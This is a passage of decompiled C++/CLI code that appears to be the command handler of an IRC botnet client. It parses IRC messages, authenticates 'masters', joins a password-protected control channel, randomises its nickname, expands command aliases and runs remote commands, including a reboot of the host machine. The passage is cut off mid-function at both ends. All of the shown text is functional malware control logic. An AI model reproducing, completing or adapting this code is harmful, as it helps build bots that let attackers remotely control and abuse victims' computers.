    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref arrayTypeBy0CaPad = (int) \u003CModule\u003E.strtok((sbyte*) &arrayTypeBy0CaaD3, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D17);
    int num5 = 1;
    do
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) (num5 * 4 + (IntPtr) &arrayTypeBy0CaPad) = (int) \u003CModule\u003E.strtok((sbyte*) 0, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D18);
      ++num5;
    }
    while (num5 < 32);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(int&) ref arrayTypeBy0CaPad == 0 || ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4) == 0)
      return 1;
    \u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040E arrayTypeBy0BaaE;
    \u003CModule\u003E.memset((void*) &arrayTypeBy0BaaE, 0, 256U);
    int num6 = 31;
    do
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      uint num7 = (uint) ^(int&) (num6 * 4 + (IntPtr) &arrayTypeBy0CaPad);
      if (num7 != 0U)
      {
        if (*(sbyte*) num7 == (sbyte) 45 && *(sbyte*) ((int) num7 + 2) == (sbyte) 0)
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(sbyte&) ((int) *(sbyte*) ((int) num7 + 1) + (IntPtr) &arrayTypeBy0BaaE) = (sbyte) 1;
          *(sbyte*) num7 = (sbyte) 0;
          *(sbyte*) ((int) num7 + 1) = (sbyte) 0;
          *(sbyte*) ((int) num7 + 2) = (sbyte) 0;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) (num6 * 4 + (IntPtr) &arrayTypeBy0CaPad) = 0;
        }
        else
          break;
      }
      --num6;
    }
    while (num6 >= 0);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(byte&) ((IntPtr) &arrayTypeBy0BaaE + 115) != (byte) 0)
      silent = 1;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(byte&) ((IntPtr) &arrayTypeBy0BaaE + 110) != (byte) 0)
    {
      silent = 0;
      notice = 1;
    }
    \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D arrayTypeBy0IaD;
    \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040D arrayTypeBy0BiD;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (*(sbyte*) ^(int&) ref arrayTypeBy0CaPad != (sbyte) 10)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0IaD, (sbyte*) ^(int&) ref arrayTypeBy0CaPad, (uint) sbyte.MaxValue);
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0BiD, (sbyte*) (^(int&) ref arrayTypeBy0CaPad + 1), 23U);
      \u003CModule\u003E.strtok((sbyte*) &arrayTypeBy0BiD, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D19);
    }
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D20, (sbyte*) ^(int&) ref arrayTypeBy0CaPad) == 0)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      *(sbyte*) (^(int&) ref arrayTypeBy0CaPad + 1) = (sbyte) 79;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D21, __arglist (^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)));
      if (*in_channel == 0)
        \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D22, __arglist ((IntPtr) channel, (IntPtr) chanpass));
      return 1;
    }
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D23, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D24, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) != 0)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D28, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        sbyte* numPtr = \u003CModule\u003E.strstr((sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 12), (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D29);
        if ((IntPtr) numPtr != IntPtr.Zero)
          \u003CModule\u003E.strncpy(host, numPtr + 1, 159U);
        return 1;
      }
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D30, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0)
      {
        \u003CModule\u003E.rndnick(nick1, 2, 1, (sbyte*) 0);
        \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D31, __arglist ((IntPtr) nick1));
        return 1;
      }
      if (\u003CModule\u003E.strcmp((sbyte*) masters, (sbyte*) &arrayTypeBy0IaD) == 0)
        num3 = 1;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D32, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0)
      {
        if (*(sbyte*) masters != (sbyte) 0)
        {
          \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0IaD, (sbyte*) masters, (uint) sbyte.MaxValue);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if (^(int&) ((IntPtr) &arrayTypeBy0CaPad + 12) != 0 && \u003CModule\u003E.strcmp((sbyte*) &arrayTypeBy0BiD, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 12)) == 0)
          {
            *(sbyte*) masters = (sbyte) 0;
            \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D33, __arglist (out arrayTypeBy0BiD));
            \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D34, __arglist (out arrayTypeBy0BiD, out arrayTypeBy0CaaD1));
          }
        }
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (\u003CModule\u003E.strcmp(nick1, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 12)) == 0)
        {
          *in_channel = 0;
          \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D35, __arglist ((IntPtr) channel, (IntPtr) chanpass));
        }
        return 1;
      }
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D36, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        sbyte* numPtr1 = (sbyte*) (^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8) + 1);
        if (\u003CModule\u003E.strcmp((sbyte*) masters, (sbyte*) &arrayTypeBy0IaD) == 0)
        {
          sbyte* numPtr2 = \u003CModule\u003E.strchr((sbyte*) &arrayTypeBy0IaD, 33);
          if ((IntPtr) numPtr2 != IntPtr.Zero)
          {
            *(sbyte*) masters = (sbyte) 58;
            \u003CModule\u003E.strcpy((sbyte*) ((IntPtr) masters + 1), numPtr1);
            \u003CModule\u003E.strcat((sbyte*) ((IntPtr) masters + 2), numPtr2);
          }
        }
        if ((IntPtr) numPtr1 != IntPtr.Zero)
        {
          if (\u003CModule\u003E.strcmp((sbyte*) &arrayTypeBy0BiD, nick1) == 0)
          {
            \u003CModule\u003E.strncpy(nick1, numPtr1, 15U);
            return 1;
          }
          int num8 = 0;
          \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D* arrayTypeBy0IaDPtr = masters;
          while (*(sbyte*) arrayTypeBy0IaDPtr == (sbyte) 0 || \u003CModule\u003E.strcmp((sbyte*) arrayTypeBy0IaDPtr, (sbyte*) &arrayTypeBy0IaD) != 0)
          {
            ++num8;
            arrayTypeBy0IaDPtr += 128;
            if (num8 >= 1)
              goto label_49;
          }
          sbyte* numPtr3 = \u003CModule\u003E.strchr((sbyte*) &arrayTypeBy0IaD, 33);
          if ((IntPtr) numPtr3 == IntPtr.Zero || \u003CModule\u003E.strlen(numPtr3) + \u003CModule\u003E.strlen(numPtr1) > 126U)
            return 1;
          \u003CModule\u003E.sprintf((sbyte*) (num8 * 128 + (IntPtr) masters), (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D37, __arglist ((IntPtr) numPtr1, (IntPtr) numPtr3));
          \u0024ArrayType\u0024\u0024\u0024BY0GE\u0040D arrayTypeBy0GeD;
          \u003CModule\u003E.irc_privmsg(sock, channel, (sbyte*) &arrayTypeBy0GeD, 0, 0);
        }
label_49:
        return 1;
      }
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D38, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0 || \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D39, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0)
      {
        int num9 = 0;
        \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D* arrayTypeBy0IaDPtr = masters;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        while (*(sbyte*) arrayTypeBy0IaDPtr == (sbyte) 0 || \u003CModule\u003E.strcmp((sbyte*) arrayTypeBy0IaDPtr, (sbyte*) ^(int&) ref arrayTypeBy0CaPad) != 0)
        {
          ++num9;
          arrayTypeBy0IaDPtr += 128;
          if (num9 >= 1)
            goto label_57;
        }
        *(sbyte*) (num9 * 128 + (IntPtr) masters) = (sbyte) 0;
        \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D40, __arglist (out arrayTypeBy0BiD));
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D41, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0)
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D42, __arglist (^(int&) ref arrayTypeBy0CaPad + 1, out arrayTypeBy0CaaD1));
        }
        return 1;
      }
label_57:
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D43, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (\u003CModule\u003E.strcmp(channel, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 16)) == 0)
          *in_channel = 1;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        \u003CModule\u003E.printf((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D44, __arglist (^(int&) ((IntPtr) &arrayTypeBy0CaPad + 16)));
        return 1;
      }
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D45, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0 || \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D46, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0 || \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D47, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D48, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D49, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) != 0)
        {
          num1 = 4;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 16) = ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 16) + 1;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8) = ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 12);
        }
        else
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D50, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0)
            notice = 1;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if (^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8) == 0)
            return 1;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if ((IntPtr) \u003CModule\u003E.strstr((sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D51) == IntPtr.Zero || notice != 0)
          {
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8) = (int) &arrayTypeBy0BiD;
          }
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if (^(int&) ((IntPtr) &arrayTypeBy0CaPad + 12) == 0)
            return 1;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 12) = ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 12) + 1;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if (^(int&) ((IntPtr) &arrayTypeBy0CaPad + 12) != 0 && (IntPtr) nick1 != IntPtr.Zero)
          {
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            num1 = \u003CModule\u003E.strncmp((sbyte*) &arrayTypeBy0BmD, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 12), \u003CModule\u003E.strlen((sbyte*) &arrayTypeBy0BmD)) == 0 ? 4 : 3;
          }
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          uint num10 = (uint) ^(int&) (num1 * 4 + (IntPtr) &arrayTypeBy0CaPad);
          if (num10 == 0U)
            return 1;
          if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D52, (sbyte*) num10) == 0)
          {
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            if (*(sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8) != (sbyte) 35)
            {
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              int num11 = ^(int&) (\u003CModule\u003E.current_version * 4 + (IntPtr) &\u003CModule\u003E.versionlist);
              if (*(sbyte*) num11 != (sbyte) 0)
              {
                // ISSUE: cast to a reference type
                // ISSUE: explicit reference operation
                \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D53, __arglist (^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), num11));
                return 1;
              }
            }
            if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D54, (sbyte*) num10) == 0)
            {
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              uint num12 = (uint) ^(int&) (num1 * 4 + ((IntPtr) &arrayTypeBy0CaPad + 4));
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              if (num12 != 0U && *(sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8) != (sbyte) 35)
              {
                // ISSUE: cast to a reference type
                // ISSUE: explicit reference operation
                \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D55, __arglist (^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (int) num12));
                return 1;
              }
            }
          }
        }
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        int num13 = ^(int&) (num1 * 4 + (IntPtr) &arrayTypeBy0CaPad);
        if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D56, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D57, (sbyte*) num13) != 0)
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if ((num3 != 0 || \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D69, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 4)) == 0) && spy == 0)
          {
            int num14 = 0;
            ALIAS* aliasPtr = (ALIAS*) &\u003CModule\u003E.aliases;
            while (\u003CModule\u003E.strcmp((sbyte*) aliasPtr, (sbyte*) num13) != 0)
            {
              ++num14;
              aliasPtr += 184;
              // ISSUE: cast to a reference type
              if ((IntPtr) aliasPtr >= (\u0024ArrayType\u0024\u0024\u0024BY0BA\u0040UALIAS\u0040\u0040&) ((IntPtr) &\u003CModule\u003E.aliases + 2944))
                goto label_105;
            }
            sbyte* numPtr4 = \u003CModule\u003E.strstr(line, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D70);
            if ((IntPtr) numPtr4 == IntPtr.Zero)
              return 1;
            numPtr4[2] = (sbyte) 46;
            numPtr4[3] = (sbyte) 46;
            int num15 = num14 * 184;
            \u003CModule\u003E.strncpy(numPtr4 + 4, (sbyte*) (num15 + ((IntPtr) &\u003CModule\u003E.aliases + 24)), 159U);
            int num16 = 15;
            int num17 = (int) (num1 * 4 + ((IntPtr) &arrayTypeBy0CaPad + 64));
            int num18 = num17;
            \u0024ArrayType\u0024\u0024\u0024BY0M\u0040D arrayTypeBy0MD;
            \u0024ArrayType\u0024\u0024\u0024BY02D arrayTypeBy02D;
            do
            {
              \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0MD, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D71, __arglist (num16));
              if ((IntPtr) \u003CModule\u003E.strstr(line, (sbyte*) &arrayTypeBy0MD) != IntPtr.Zero)
              {
                if (*(int*) num18 != 0)
                {
                  _Str = (sbyte*) ((int) \u003CModule\u003E.strlen((sbyte*) (num15 + (IntPtr) &\u003CModule\u003E.aliases)) + (IntPtr) _Str);
                  if ((IntPtr) _Str != IntPtr.Zero)
                  {
                    sbyte* repstr = \u003CModule\u003E.strstr(_Str, (sbyte*) *(int*) (num18 - 4));
                    if ((IntPtr) repstr != IntPtr.Zero)
                    {
                      \u003CModule\u003E.replacestr(line, (sbyte*) &arrayTypeBy0MD, repstr);
                      goto label_98;
                    }
                    else
                      goto label_98;
                  }
                  else
                    goto label_98;
                }
              }
              else if (*(int*) num18 != 0)
                goto label_98;
              \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy02D, (sbyte*) &arrayTypeBy0MD, 2U);
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              ^(sbyte&) ((IntPtr) &arrayTypeBy02D + 2) = (sbyte) 0;
              \u003CModule\u003E.replacestr(line, (sbyte*) &arrayTypeBy0MD, (sbyte*) &arrayTypeBy02D);
label_98:
              --num16;
              num18 -= 4;
            }
            while (num16 > 0);
            int num19 = 16;
            int num20 = num17;
            do
            {
              \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0MD, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D72, __arglist (num19));
              if ((IntPtr) \u003CModule\u003E.strstr(line, (sbyte*) &arrayTypeBy0MD) != IntPtr.Zero)
              {
                uint repstr = (uint) *(int*) num20;
                if (repstr != 0U)
                  \u003CModule\u003E.replacestr(line, (sbyte*) &arrayTypeBy0MD, (sbyte*) repstr);
              }
              --num19;
              num20 -= 4;
            }
            while (num19 > 0);
            num4 = 1;
label_105:
            if (*(sbyte*) num13 != (sbyte) 46 && num4 == 0)
            {
              if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D84, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D85, (sbyte*) num13) != 0)
              {
                if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D90, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D91, (sbyte*) num13) != 0)
                {
                  if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D93, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D94, (sbyte*) num13) != 0)
                  {
                    if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D96, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D97, (sbyte*) num13) != 0)
                    {
                      if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D99, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D100, (sbyte*) num13) != 0)
                      {
                        if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D103, (sbyte*) num13) == 0)
                        {
                          sbyte* numPtr5 = \u003CModule\u003E.Reboot() == 0 ? (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D105 : (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D104;
                          \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, numPtr5, __arglist ());
                          // ISSUE: cast to a reference type
                          // ISSUE: explicit reference operation
                          \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &arrayTypeBy0CaaD1, notice, 0);
                          return 1;
                        }
                        if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D106, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D107, (sbyte*) num13) != 0)
                        {
                          if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D108, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D109, (sbyte*) num13) != 0)
                          {
                            if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D110, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D111, (sbyte*) num13) != 0)
                            {
                              if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D112, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D113, (sbyte*) num13) != 0)
                              {
                                if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D114, (sbyte*) num13) == 0)
                                {
                                  if (silent == 0)
                                  {
                                    // ISSUE: cast to a reference type
                                    // ISSUE: explicit reference operation
                                    \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D115, notice, 0);
                                  }
                                  sbyte* numPtr6 = *(sbyte*) masters == (sbyte) 0 ? (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D116 : (sbyte*) ((IntPtr) masters + 1);
                                  \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D117, __arglist (0, (IntPtr) numPtr6));
                                  // ISSUE: cast to a reference type
                                  // ISSUE: explicit reference operation
                                  \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &arrayTypeBy0CaaD1, notice, 1);
                                }
                                else if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D118, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D119, (sbyte*) num13) != 0)
                                {
                                  if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D121, (sbyte*) num13) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D122, (sbyte*) num13) != 0)
                                  {
